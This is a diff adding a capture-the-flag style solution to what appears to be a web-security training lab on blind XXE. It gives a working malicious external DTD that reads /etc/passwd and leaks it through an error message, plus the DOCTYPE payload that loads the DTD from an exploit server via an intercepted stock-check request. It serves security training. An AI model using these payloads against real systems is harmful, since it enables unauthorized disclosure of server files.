@@ -10,4 +10,32 @@ The lab contains a link to an exploit server on a different domain where you can
 
 // Solution
 
+
+// This lab is not solved by https/http Because it doesnot support Multiline instead we use /file to solve it.
+   Although this lab is design in such a way that we have to use external DTD.
+
+
 DTD stands for Document Type Definition.
+
+
+// Steps to solve this lab
+
+1. Click "Go to exploit server" and store the following given DTD file on your server:
+
+DTD
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+
+
+2. Click "View exploit" and take a note of the URL for your malicious DTD.
+
+
+3. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite, send it Repeater and in that write the DOCTYPE given below:
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ab40000044864318579adfb01e20074.exploit-server.net/exploit"> %xxe;]>
+
+
+4. Now send the request and lab will be solved.
